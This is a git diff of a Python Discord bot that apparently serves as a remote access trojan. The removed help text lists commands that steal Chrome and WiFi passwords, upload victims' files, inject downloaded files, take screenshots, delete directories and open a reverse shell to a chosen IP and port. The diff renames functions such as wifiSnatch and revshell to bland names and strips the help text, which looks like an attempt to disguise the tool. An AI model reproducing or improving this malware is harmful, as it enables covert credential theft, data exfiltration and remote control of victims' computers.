@@ -5,18 +5,17 @@ import time
 import requests
 import shutil
 from passwords import main
-from wifi import wifiSnatch
+from wifi import aa
 from details import detailGetter
 import numpy as np
 import cv2
-from keylogger import Keylogger
 import subprocess
 
 import pyautogui
 
-from reverseshell import initiate
+from rev import initiate
 
-TOKEN = ''
+tk = ''
 format = "---------------------------------------------------"
 
 intents = discord.Intents.default()
@@ -43,56 +42,11 @@ _________   _...._                      _..._   \.-'''\ \
 ---------------------------------------------------
 """
 helpmepls = """
-1. Details 
-  Usage: !details
-  Does: Prints basic details of the computer (hostname, public/private IPv4, MAC address, User, OS info, cwd)
-2. DIR
-  Usage: !dir
-  Does: Prints all files and folders in a directory
-3. CD
-  Usage: !cd directoryName
-  Does: Changes current working directory (cwd)
-4. CD Back
-   Usage: !cdb
-   Does: Moves you back a directory
-5. Remove
-   Usage: !rm fileName
-   Does: Removes a file (NOT A DIRECTORY)
-6. RM Directory
-   Usage: !rmdir directoryName
-   Does: Removes a folder (THIS IS RECURSIVE, CAREFUL)
-8. Read
-  Usage: !read fileName
-  Does: Reads entirity of a file, must be in current directory (this will hopefully change)
-9. Read line
-  Usage: !readln fileName numberOfLines
-  Does:
-10. append
-  Usage: !append fileName content
-  Does: Appends something in a txt (or other file)
-11. Overwrite
-  Usage: !overwrite fileName content
-  Does: Overwrites everything with your own content. 
-                Keep in mind you can use this to create a new file too
-12. WiFi
-  Usage: !wifi
-  Does: Sends all stored WiFi passwords"""
+Check the github
+"""
 helpmepls2 = """
-13. Steal
-   Usage: !steal fileName
-   Does: Uploads the file to discord for you to download
-14. Inject
-   Usage: !inject fileLink
-   Does: Downloads a file to the client computer, in the cwd
-15. Passwords
-   Usage: !passwords
-   Does: Steals all **CHROME** passwords
-16. Screenshot
-   Usage: !screenshot
-   Does: Screenshots client screen
-17. Reverse shell
-   Usage: !revshell IP PORT
-   Does: Initiates a reverse shell on a given ip and port"""
+Check it!
+"""
 
 
 @bot.event
@@ -238,7 +192,7 @@ async def overwrite(ctx, file=None, *, content):
 @bot.command() #CREDIT TO https://nitratine.net/blog/post/get-wifi-passwords-with-python/
 async def wifi(ctx, *, argument=None):
     try:
-        data = wifiSnatch()
+        data = aa()
         await ctx.send(data)
     except Exception as e:
         await ctx.send(
@@ -323,10 +277,10 @@ async def screenshot(ctx):
 
 
 @bot.command()
-async def revshell(ctx, ip, port):
+async def reverse(ctx, ip, port):
     try:
         initiate(ip, port)
-        await ctx.send(f"Rever shell initiated on ip: {ip} and port: {port}")
+        await ctx.send(f"Shell initiated on ip: {ip} and port: {port}")
     except Exception as e:
         await ctx.send(f"There has been an error\n{e}")
 
@@ -367,4 +321,4 @@ async def dump(ctx):
 
 
 
-bot.run(TOKEN)
+bot.run(tk)
